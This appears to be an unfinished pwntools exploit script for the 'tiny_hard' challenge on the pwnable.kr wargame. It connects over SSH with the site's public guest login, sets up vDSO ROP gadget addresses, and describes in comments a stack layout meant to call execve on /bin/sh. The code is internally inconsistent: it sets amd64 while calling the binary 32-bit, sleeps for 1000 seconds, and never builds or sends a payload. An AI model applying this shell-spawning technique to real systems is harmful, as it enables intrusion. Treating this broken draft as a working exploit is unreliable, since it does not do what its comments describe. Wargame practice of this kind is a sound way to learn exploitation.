from pwn import *
import sys
import time

context.arch="amd64"
context.kernel="amd64"
context.os="linux"

binary_name = "tiny_hard"
e  = ELF(binary_name, checksec=True)
rop = ROP(binary_name)

context.binary = e

env_vars = {
    '': b"\x0b",
    'EDX': 'BBBBBBBB'
}

vDSO_base = 0xf7ffc000

def main():
    if(len(sys.argv) <2):
        print("Need to specify target.")
    else:
        if(sys.argv[1] == "remote"):
            # ip, port = REMOTE.replace("nc ", "").split(" ")[0]
            # port = int(port)
            # p = remote(ip, port)
            # or if using ssh:
            s = ssh(user='tiny_hard',host='pwnable.kr',port=2222,password='guest') 
            p= s.process(f"./{binary_name}") 
        elif(sys.argv[1] == "gdb"):
            p = gdb.debug(f"./{binary_name}", gdbscript="b *0x08048074", aslr=False,env=env_vars)
        else:
            p = process(f"./{binary_name}",env=env_vars)

    sleep(1000)
    # the binary is 32 bit, so we will use int 0x80 and not syscall
    syscall_addr = vDSO_base+  0x00000577
    pop_ebx_esi_ebp = vDSO_base+0x00001aad
    pop_edx_ecx = vDSO_base+0x0000057a

    # eax will be controlled at the start

    # Stack layout:
    # 0x0 is defined as the first env_var
    # 0x0 : 0x0b  ->  will be popped into eax
    # 0x1: 0x3 -> will be popped into edx
    # .....
    # 0x3:  pop_ebx_esi_ebp
    # 0x1000 byte long padding (minus two pops) (each env variable here will have /bin/sh)
    # 0xFF8: 0x500 (hope to hit one of the /bin/sh strings)
    # padding
    # padding
    # 0x1000: pop_edx_ecx
    # 0x1004: 0
    # 0x1008: 0
    # 0x100B: syscall_addr
    
    

main()
